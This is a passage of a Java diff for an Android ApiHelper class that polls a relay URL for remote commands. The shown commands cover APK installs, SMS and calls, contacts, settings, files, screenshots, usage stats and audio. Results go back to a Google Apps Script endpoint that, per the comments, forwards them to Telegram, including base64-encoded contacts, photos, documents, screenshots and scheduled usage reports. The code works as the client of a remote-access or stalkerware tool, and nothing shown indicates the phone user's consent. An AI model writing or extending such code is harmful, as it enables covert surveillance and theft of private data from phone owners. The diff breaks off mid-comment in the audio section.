@@ -809,6 +809,1443 @@ public class ApiHelper {
     }
 
     // =========================================================
+    // UPDATE / INSTALL APK
+    // =========================================================
+
+    public static JSONObject getUpdateRequest() {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL + "?action=getUpdateRequest");
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String body = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300 ||
+                    body == null || body.trim().isEmpty()) return null;
+
+            return new JSONObject(body);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error getUpdateRequest", e);
+            return null;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    /** Kirim update progress ke GAS → diteruskan ke Telegram. */
+    public static boolean sendUpdateProgress(
+            String requestId, String message) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",    "updateProgress");
+            json.put("requestId", requestId == null ? "" : requestId);
+            json.put("message",   message == null ? "" : message);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            readResponse(stream);
+
+            return responseCode >= 200 && responseCode < 300;
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendUpdateProgress", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    /** Kirim hasil akhir update ke GAS. */
+    public static boolean sendUpdateResult(
+            String requestId, boolean success, String message) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",    "updateResult");
+            json.put("requestId", requestId == null ? "" : requestId);
+            json.put("success",   success);
+            json.put("message",   message == null ? "" : message);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) return false;
+
+            try {
+                return "success".equalsIgnoreCase(
+                        new JSONObject(responseBody).optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendUpdateResult", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    // =========================================================
+    // PHONE (SMS + CALL)
+    // =========================================================
+
+    public static JSONObject getPhoneRequest() {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL + "?action=getPhoneRequest");
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String body = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300 ||
+                    body == null || body.trim().isEmpty()) return null;
+
+            return new JSONObject(body);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error getPhoneRequest", e);
+            return null;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    public static boolean sendPhoneResult(
+            String requestId, boolean success, String message) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",    "phoneResult");
+            json.put("requestId", requestId == null ? "" : requestId);
+            json.put("success",   success);
+            json.put("message",   message == null ? "" : message);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) return false;
+
+            try {
+                return "success".equalsIgnoreCase(
+                        new JSONObject(responseBody).optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendPhoneResult", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    // =========================================================
+    // CALENDAR
+    // =========================================================
+
+    public static JSONObject getCalendarRequest() {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL + "?action=getCalendarRequest");
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String body = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300 ||
+                    body == null || body.trim().isEmpty()) return null;
+
+            return new JSONObject(body);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error getCalendarRequest", e);
+            return null;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    /**
+     * Kirim hasil kalender ke GAS.
+     * requestId kosong = push otomatis (reminder).
+     */
+    public static boolean sendCalendarResult(
+            String requestId, String text) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",    "calendarResult");
+            json.put("requestId", requestId == null ? "" : requestId);
+            json.put("text",      text == null ? "" : text);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) return false;
+
+            try {
+                return "success".equalsIgnoreCase(
+                        new JSONObject(responseBody).optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendCalendarResult", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    // =========================================================
+    // DND
+    // =========================================================
+
+    public static JSONObject getDndRequest() {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL + "?action=getDndRequest");
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String body = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300 ||
+                    body == null || body.trim().isEmpty()) return null;
+
+            return new JSONObject(body);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error getDndRequest", e);
+            return null;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    public static boolean sendDndResult(
+            String requestId, boolean success, String message) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",    "dndResult");
+            json.put("requestId", requestId == null ? "" : requestId);
+            json.put("success",   success);
+            json.put("message",   message == null ? "" : message);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) return false;
+
+            try {
+                return "success".equalsIgnoreCase(
+                        new JSONObject(responseBody).optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendDndResult", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    // =========================================================
+    // CONTACT
+    // =========================================================
+
+    public static JSONObject getContactRequest() {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL + "?action=getContactRequest");
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String body = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300 ||
+                    body == null || body.trim().isEmpty()) return null;
+
+            return new JSONObject(body);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error getContactRequest", e);
+            return null;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    /**
+     * Kirim hasil operasi kontak ke GAS.
+     * - text: pesan teks biasa (search/add/delete/count)
+     * - vcfBase64: data VCF ter-encode (untuk export), null jika tidak ada
+     */
+    public static boolean sendContactResult(
+            String requestId,
+            String operation,
+            String text,
+            String vcfBase64) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(90000);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",    "contactResult");
+            json.put("requestId", requestId == null ? "" : requestId);
+            json.put("operation", operation == null ? "" : operation);
+            json.put("text",      text       == null ? "" : text);
+            json.put("vcfBase64", vcfBase64  == null ? "" : vcfBase64);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) return false;
+
+            try {
+                return "success".equalsIgnoreCase(
+                        new JSONObject(responseBody).optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendContactResult", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    // =========================================================
+    // SETTINGS
+    // =========================================================
+
+    public static JSONObject getSettingsRequest() {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL + "?action=getSettingsRequest");
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String body = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300 ||
+                    body == null || body.trim().isEmpty()) return null;
+
+            return new JSONObject(body);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error getSettingsRequest", e);
+            return null;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    public static boolean sendSettingsResult(
+            String requestId, boolean success, String message) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",    "settingsResult");
+            json.put("requestId", requestId == null ? "" : requestId);
+            json.put("success",   success);
+            json.put("message",   message == null ? "" : message);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) return false;
+
+            try {
+                return "success".equalsIgnoreCase(
+                        new JSONObject(responseBody).optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendSettingsResult", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    // =========================================================
+    // USAGE STATS
+    // =========================================================
+
+    public static JSONObject getUsageRequest() {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL + "?action=getUsageRequest");
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String body = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300 ||
+                    body == null || body.trim().isEmpty()) return null;
+
+            return new JSONObject(body);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error getUsageRequest", e);
+            return null;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    /**
+     * Kirim hasil usage stats ke GAS (on-demand dari Telegram).
+     */
+    public static boolean sendUsageReport(
+            String requestId, String period, String reportText) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",     "usageReport");
+            json.put("requestId",  requestId == null ? "" : requestId);
+            json.put("period",     period == null ? "" : period);
+            json.put("reportText", reportText == null ? "" : reportText);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) return false;
+
+            try {
+                return "success".equalsIgnoreCase(
+                        new JSONObject(responseBody).optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendUsageReport", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    /**
+     * Push laporan otomatis (harian/mingguan) dari WorkManager ke GAS.
+     * Tidak membutuhkan requestId — GAS langsung forward ke Telegram.
+     */
+    public static boolean sendAutoUsageReport(String reportText, String type) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",     "autoUsageReport");
+            json.put("type",       type == null ? "daily" : type);
+            json.put("reportText", reportText == null ? "" : reportText);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+            readResponse(stream);
+
+            return responseCode >= 200 && responseCode < 300;
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendAutoUsageReport", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    // =========================================================
+    // FILE & MEDIA
+    // =========================================================
+
+    public static JSONObject getFileRequest() {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL + "?action=getFileRequest");
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String body = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300 ||
+                    body == null || body.trim().isEmpty()) return null;
+
+            return new JSONObject(body);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error getFileRequest", e);
+            return null;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    /**
+     * Kirim hasil file (foto/video/dokumen) ke GAS.
+     * GAS meneruskan ke Telegram sebagai dokumen/foto/video.
+     */
+    public static boolean sendFileResult(
+            String requestId,
+            String operation,
+            FileHelper.FileResult result) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(90000); // 90 detik untuk file besar
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",     "fileResult");
+            json.put("requestId",  requestId == null ? "" : requestId);
+            json.put("operation",  operation);
+            json.put("hasFile",    result.hasFile);
+            json.put("name",       result.name);
+            json.put("path",       result.path);
+            json.put("size",       result.size);
+            json.put("sizeLabel",  result.sizeLabel());
+            json.put("mimeType",   result.mimeType == null ? "" : result.mimeType);
+            json.put("tooBig",     result.tooBig);
+            json.put("base64",     result.base64 == null ? "" : result.base64);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) return false;
+
+            try {
+                JSONObject resp = new JSONObject(responseBody);
+                return "success".equalsIgnoreCase(resp.optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendFileResult", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    /**
+     * Kirim hasil list/search file ke GAS sebagai teks.
+     */
+    public static boolean sendFileListResult(
+            String requestId,
+            String operation,
+            String params,
+            java.util.List<String> items) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            // Gabungkan list menjadi teks
+            StringBuilder sb = new StringBuilder();
+            for (String item : items) {
+                sb.append(item).append("\n");
+            }
+
+            JSONObject json = new JSONObject();
+            json.put("action",    "fileListResult");
+            json.put("requestId", requestId == null ? "" : requestId);
+            json.put("operation", operation);
+            json.put("params",    params == null ? "" : params);
+            json.put("text",      sb.toString().trim());
+            json.put("count",     items.size());
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) return false;
+
+            try {
+                JSONObject resp = new JSONObject(responseBody);
+                return "success".equalsIgnoreCase(resp.optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendFileListResult", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    /**
+     * Kirim hasil screenshot ke GAS.
+     */
+    public static boolean sendScreenshotResult(
+            String requestId,
+            String base64,
+            int width,
+            int height) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(90000);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",    "fileResult");
+            json.put("requestId", requestId == null ? "" : requestId);
+            json.put("operation", "screenshot");
+            json.put("hasFile",   true);
+            json.put("name",      "screenshot.png");
+            json.put("mimeType",  "image/png");
+            json.put("base64",    base64 == null ? "" : base64);
+            json.put("tooBig",    false);
+            json.put("width",     width);
+            json.put("height",    height);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) return false;
+
+            try {
+                JSONObject resp = new JSONObject(responseBody);
+                return "success".equalsIgnoreCase(resp.optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendScreenshotResult", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    public static boolean updateFileRequestStatus(String requestId, String status) {
+
+        if (requestId == null || requestId.trim().isEmpty()) return false;
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",    "fileRequestStatus");
+            json.put("requestId", requestId);
+            json.put("status",    status);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+            readResponse(stream);
+
+            return responseCode >= 200 && responseCode < 300;
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error updateFileRequestStatus", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    // =========================================================
+    // AUDIO
+    // =========================================================
+
+    /**
+     * Cek pending audio request dari GAS.
+     * Android -> Worker -> Apps Script (doGet, action=getAudioRequest)
+     */
+    public static JSONObject getPendingAudioRequest() {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL + "?action=getAudioRequest");
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String body = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300 ||
+                    body == null || body.trim().isEmpty()) {
+                return null;
+            }
+
+            return new JSONObject(body);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error getting audio request", e);
+            return null;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    /**
+     * Kirim hasil rekaman audio ke GAS → diteruskan ke Telegram.
